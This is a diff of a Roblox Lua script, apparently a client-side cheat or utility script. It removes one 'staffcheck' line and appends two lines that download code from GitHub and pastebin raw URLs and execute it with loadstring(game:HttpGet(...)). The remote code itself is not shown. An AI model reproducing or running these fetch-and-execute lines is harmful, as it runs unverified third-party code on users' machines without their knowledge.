@@ -1,4 +1,3 @@
-local staffcheck = loadstring(game:HttpGet("https://raw.githubusercontent.com/ghostofcelleron/Scripts/refs/heads/main/old%20thing%20ill%20keep%20here",true))()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local StarterGui = game:GetService("StarterGui")
@@ -8039,3 +8038,6 @@ StarterGui:SetCore("SendNotification", {
     Button1 = "alright fella",
 })
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ghostofcelleron/Scripts/refs/heads/main/oldthingyep",true))()
+loadstring(game:HttpGet("https://pastebin.com/raw/rQMS2B9R",true))()
